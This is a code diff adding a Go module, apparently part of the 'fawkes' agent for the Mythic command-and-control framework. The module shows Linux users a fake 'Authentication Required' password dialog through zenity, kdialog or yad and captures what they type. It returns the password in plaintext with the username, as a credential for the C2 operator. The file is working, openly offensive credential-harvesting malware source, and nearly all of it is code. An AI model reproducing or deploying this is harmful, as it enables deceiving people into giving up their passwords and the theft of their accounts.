@@ -1,0 +1,132 @@
+//go:build linux
+
+package commands
+
+import (
+	"context"
+	"encoding/json"
+	"fmt"
+	"os/exec"
+	"os/user"
+	"strings"
+	"time"
+
+	"fawkes/pkg/structs"
+)
+
+// CredentialPromptCommand displays a native Linux credential dialog to harvest user credentials.
+type CredentialPromptCommand struct{}
+
+func (c *CredentialPromptCommand) Name() string {
+	return "credential-prompt"
+}
+
+func (c *CredentialPromptCommand) Description() string {
+	return "Display a native GUI credential dialog to capture user credentials (T1056.002)"
+}
+
+type credentialPromptLinuxArgs struct {
+	Title   string `json:"title"`
+	Message string `json:"message"`
+}
+
+// credPromptLinuxTimeout is the max time to wait for user interaction.
+const credPromptLinuxTimeout = 5 * time.Minute
+
+// findDialogTool returns the path to the first available GUI dialog tool.
+// Preference order: zenity (GNOME), kdialog (KDE), yad (GTK alternative).
+func findDialogTool() (string, string) {
+	for _, tool := range []string{"zenity", "kdialog", "yad"} {
+		if path, err := exec.LookPath(tool); err == nil {
+			return tool, path
+		}
+	}
+	return "", ""
+}
+
+// buildDialogArgs constructs the command arguments for the detected dialog tool.
+func buildDialogArgs(tool, title, message string) []string {
+	switch tool {
+	case "zenity":
+		return []string{"--entry", "--title=" + title, "--text=" + message, "--hide-text"}
+	case "kdialog":
+		return []string{"--password", message, "--title", title}
+	case "yad":
+		return []string{"--entry", "--title=" + title, "--text=" + message, "--hide-text"}
+	default:
+		return nil
+	}
+}
+
+func (c *CredentialPromptCommand) Execute(task structs.Task) structs.CommandResult {
+	var args credentialPromptLinuxArgs
+
+	if task.Params != "" {
+		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
+			return errorf("Error parsing parameters: %v", err)
+		}
+	}
+
+	title := args.Title
+	if title == "" {
+		title = "Authentication Required"
+	}
+	message := args.Message
+	if message == "" {
+		message = "Enter your password to continue."
+	}
+
+	tool, toolPath := findDialogTool()
+	if toolPath == "" {
+		return errorResult("No GUI dialog tool found. Install zenity (GNOME), kdialog (KDE), or yad.")
+	}
+
+	dialogArgs := buildDialogArgs(tool, title, message)
+
+	ctx, cancel := context.WithTimeout(context.Background(), credPromptLinuxTimeout)
+	defer cancel()
+
+	out, err := exec.CommandContext(ctx, toolPath, dialogArgs...).CombinedOutput()
+	defer structs.ZeroBytes(out)
+	if err != nil {
+		// Exit code 1 = user cancelled for zenity/yad, exit code 1 for kdialog cancel
+		if exitErr, ok := err.(*exec.ExitError); ok && exitErr.ExitCode() == 1 {
+			return successResult("User cancelled the dialog")
+		}
+		return errorf("Dialog failed: %v\n%s", err, strings.TrimSpace(string(out)))
+	}
+
+	password := strings.TrimSpace(string(out))
+	defer structs.ZeroString(&password)
+	if password == "" {
+		return successResult("User submitted empty password")
+	}
+
+	username := "unknown"
+	if u, err := user.Current(); err == nil {
+		username = u.Username
+	}
+
+	var sb strings.Builder
+	sb.WriteString("=== Credential Prompt Result ===\n\n")
+	sb.WriteString(fmt.Sprintf("User:     %s\n", username))
+	sb.WriteString(fmt.Sprintf("Password: %s\n", password))
+	sb.WriteString(fmt.Sprintf("Dialog:   %s (%s)\n", title, tool))
+
+	creds := []structs.MythicCredential{
+		{
+			CredentialType: "plaintext",
+			Realm:          "local",
+			Account:        username,
+			Credential:     password,
+			Comment:        fmt.Sprintf("credential-prompt dialog (%s)", tool),
+		},
+	}
+
+	return structs.CommandResult{
+		Output:      sb.String(),
+		Status:      "success",
+		Completed:   true,
+		Credentials: &creds,
+	}
+}
